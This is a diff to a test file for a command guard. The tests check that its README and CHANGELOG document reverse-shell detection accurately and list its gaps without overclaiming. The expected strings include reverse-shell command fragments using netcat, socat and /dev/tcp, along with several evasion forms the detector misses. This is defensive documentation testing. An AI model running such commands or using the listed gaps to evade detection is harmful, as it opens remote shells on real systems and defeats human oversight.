@@ -494,12 +494,24 @@ describe('#1005 — the other surfaces know the signal', () => {
       'Action Guard is off by default', '`reverse-shell` signal', 'dangerous approval tier', 'never a block',
       'never the catastrophic tier', 'four families', 'netcat', 'socat', '`/dev/tcp`', 'piped into netcat',
       'Only a human answer releases it', 'An `actionGuard.autoApprove` entry never releases it', 'approval-broker pre-clear',
-      'watch-only advisory mode', 'does not read into a function body', '`case` arm', '`nc h 4444 | env sh`', 'not tap-eligible', 'fall back to a copy of the same pattern',
+      'watch-only advisory mode', 'a function body', '`case` arm', '`nc h 4444 | env sh`', 'not tap-eligible', 'fall back to a copy of the same pattern',
       'does not catch every one', 'not a complete defence', 'Not covered',
+      // #1088 r5b (Jarvis N1, N2, N5): the named wrapper list, the further command-position gaps, `nc -c` on macOS/FreeBSD.
+      '(only these, at any path', '`coproc`', '`3<>/dev/tcp/h/4444 bash <&3 >&3`', '`chroot`', '`toybox`', '`rbash`', '`busybox sh` as the pipe target',
+      '`nc h 4444 | tee x | sh`', '`sh -i | busybox nc …`', '`sh -i | socat - tcp:…`', '`xargs … sh -c`', 'on OpenBSD it turns on TLS', '`nc -c h 25` asks too',
     ]) expect({ fact, present: para!.includes(fact) }).toEqual({ fact, present: true });
     for (const claim of [/\bprevents?\b/i, /\bevery reverse shell\b/i, /\bfully\b/i, /\bcomprehensive\b/i, /\bguarantee/i]) {
       expect({ claim: String(claim), present: claim.test(para!) }).toEqual({ claim: String(claim), present: false });
     }
+  });
+
+  it('the CHANGELOG entry uses the README wording: the named wrappers and shell keywords, the same gaps, no wider claim', () => {
+    const entry = fs.readFileSync(path.join(REPO, 'CHANGELOG.md'), 'utf-8').split('\n')
+      .find((l) => l.startsWith('- **Action Guard asks before a reverse shell runs (#1005).**'));
+    expect(entry).toBeDefined();
+    for (const gone of ['compound-command keywords', 'wrapper commands at any path']) expect({ gone, present: entry!.includes(gone) }).toEqual({ gone, present: false });
+    for (const fact of ['(only these, at any path', 'shell keywords such as `if`, `while` and `{`', '`coproc`', '`nc h 4444 | tee x | sh`',
+      '`3<>/dev/tcp/h/4444 bash <&3 >&3`', '`nc -c h 25` asks too', 'for this signal only']) expect({ fact, present: entry!.includes(fact) }).toEqual({ fact, present: true });
   });
 });
 
